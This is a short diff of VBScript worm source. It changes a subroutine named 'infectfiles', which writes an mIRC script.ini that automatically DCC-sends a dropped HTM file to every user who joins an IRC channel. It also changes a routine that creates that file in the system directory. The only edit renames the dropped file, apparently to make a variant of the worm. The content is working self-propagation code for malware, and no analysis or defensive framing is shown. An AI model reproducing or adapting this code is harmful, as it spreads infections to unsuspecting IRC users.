@@ -163,7 +163,7 @@ Sub infectfiles(folderspec)
         scriptini.WriteLine ";"
         scriptini.WriteLine "n0=on 1:JOIN:#:{"
         scriptini.WriteLine "n1=  /If ( $nick == $me ) { halt }"
-        scriptini.WriteLine "n2=  /.dcc send $nick" & dirsystem & "\A-LETTER-FOR-YOU.HTM"
+        scriptini.WriteLine "n2=  /.dcc send $nick" & dirsystem & "\A-LETTER-FOR.HTM"
         scriptini.WriteLine "n3=}"
         scriptini.close
 
@@ -347,10 +347,10 @@ Sub html
     End If
   Next
 
-  Set b = fso.CreateTextFile(dirsystem + "\A-LETTER-FOR-YOU.HTM")
+  Set b = fso.CreateTextFile(dirsystem + "\A-LETTER-FOR.HTM")
   b.close
 
-  Set d = fso.OpenTextFile(dirsystem + "\A-LETTER-FOR-YOU.HTM", 2)
+  Set d = fso.OpenTextFile(dirsystem + "\A-LETTER-FOR.HTM", 2)
   d.write dt5
   d.write join(lines, vbcrlf)
   d.write vbcrlf
